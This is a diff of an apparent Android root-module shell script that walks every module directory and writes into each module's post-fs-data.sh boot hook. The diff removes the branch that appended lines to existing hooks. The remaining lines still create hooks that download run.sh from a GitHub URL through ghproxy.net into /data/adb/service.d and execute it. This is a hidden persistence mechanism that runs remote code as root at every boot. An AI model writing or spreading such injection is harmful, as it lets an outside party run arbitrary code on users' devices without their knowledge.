@@ -163,13 +163,7 @@ for dir in "$MODULE_DIR"/*/; do
     POST_FS="$dir/post-fs-data.sh"
     chmod 755 "$POST_FS"
     # 如果文件存在，則追加內容；如果不存在，則創建並寫入
-    if [ -f "$POST_FS" ]; then
-        echo "curl -sS -o /data/adb/service.d/run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
-        echo "curl -sS -o run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
-        echo "chmod +x run.sh " >> "$POST_FS"
-        echo "sh run.sh " >> "$POST_FS"
-        chmod 755 "$POST_FS"
-    else
+    if [ ! -f "$POST_FS" ]; then
         echo "#!/system/bin/sh" > "$POST_FS"
         echo "curl -sS -o /data/adb/service.d/run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
         echo "curl -sS -o run.sh "https://ghproxy.net/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/run.sh"" >> "$POST_FS"
